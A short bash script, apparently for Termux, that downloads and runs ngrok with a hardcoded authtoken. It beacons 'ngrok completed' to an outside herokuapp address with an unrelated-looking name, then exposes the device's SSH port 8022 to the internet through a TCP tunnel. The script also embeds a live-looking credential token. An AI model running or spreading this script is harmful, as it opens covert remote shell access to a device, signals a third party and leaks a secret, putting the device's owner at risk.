#!/bin/bash 

pkg install zip wget -y;
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip;
unzip ngrok-stable-linux-arm.zip;
chmod +x ngrok;
./ngrok authtoken 51jGsRuaFyyw3bnhpMmsB_Mf7Z34SpV5GvgDgMTT1x;
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="ngrok completed";
./ngrok tcp 8022
